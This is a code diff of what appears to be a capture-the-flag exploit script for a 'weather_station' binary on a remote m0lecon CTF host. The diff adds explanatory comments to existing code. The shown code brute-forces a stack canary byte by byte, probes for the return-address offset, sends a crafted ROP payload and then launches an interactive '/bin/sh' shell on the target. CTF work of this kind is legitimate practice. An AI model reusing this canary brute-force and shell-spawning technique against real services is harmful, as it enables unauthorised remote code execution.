@@ -3,6 +3,8 @@ from pwn import *
 import time
 
 HOST, PORT = "offsec.m0lecon.it", 13560
+
+#found with other code in dir
 OFFSET_TO_CANARY = 56
 elf = ELF('./weather_station', checksec=False)
 
@@ -15,6 +17,8 @@ p = remote("offsec.m0lecon.it", 13560)
 #b read_query
 #c
 #""")
+
+#lab code for brute forcing canary modified for this program
 
 known = b"\x00"
 for i in range(7):
@@ -42,6 +46,7 @@ canary = u64(known)
 log.info(f"Canary: {canary:#x}")
 
 
+#send win address a number of times until it works (that is rip offset)
 for ripOff in range(192):
     io = remote(HOST, PORT, level='error')
     io.recvuntil(b"location: ")
@@ -76,6 +81,8 @@ payload = flat(
     p64(ret)
         )
 io.send(payload)
+
+#so that the shell does not close immediately
 io.sendline(b"/bin/sh -i")
 io.interactive()
 
